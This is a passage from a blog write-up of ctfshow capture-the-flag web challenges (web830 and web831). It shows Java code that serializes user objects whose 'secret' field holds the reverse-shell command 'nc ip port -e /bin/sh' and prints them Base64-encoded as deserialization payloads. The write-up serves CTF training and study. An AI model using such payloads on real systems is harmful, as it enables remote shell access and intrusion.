class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="string">&quot;cyxin&quot;</span>);</span><br><span class="line">        user.secret = <span class="string">&quot;nc ip port -e /bin/sh&quot;</span>;</span><br><span class="line">        ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(bo);</span><br><span class="line">        oo.writeObject(user);</span><br><span class="line">         <span class="keyword">byte</span>[] bytes = bo.toByteArray();</span><br><span class="line">        bo.close();</span><br><span class="line">        oo.close();</span><br><span class="line">        String userData  = <span class="keyword">new</span> String(Base64.getEncoder().encode(bytes));</span><br><span class="line">        System.out.println(userData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">BaseUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseUser</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">9058183616471264199L</span>;</span><br><span class="line">    <span class="keyword">public</span> String secret=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="web831"><a href="#web831" class="headerlink" title="web831"></a>web831</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BaseUser user = <span class="keyword">new</span> BaseUser();</span><br><span class="line">        user.secret = <span class="string">&quot;nc ip port -e /bin/sh&quot;</span>;</span><br><span class="line">        ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(bo);</span><br><span class="line">        oo.writeObject(user);</span><br><span class="line">         <span class="keyword">byte</span>[] bytes = bo.toByteArray();</span><br><span class="line">        bo.close();</span><br><span class="line">        oo.close();</span><br><span class="line">        String userData  = <span class="keyword">new</span> String(Base64.getEncoder().encode(bytes));</span><br><span class="line">        System.out.println(userData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/02/ctfshow 常用姿势/">http://example.com/2022/11/02/ctfshow 常用姿势/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/11/02/ctfshow%20%E6%96%B0%E6%89%8B%E6%9D%AFweb/"><i class="fa fa-chevron-left">  </i><span>ctfshow 新手杯web</span></a></div><div class="next-post pull-right"><a href="/2022/09/24/DASCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%88web%E9%83%A8%E5%88%86%EF%BC%89/"><span>DASCTF X CBCTF 2022九月挑战赛（web部分）</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>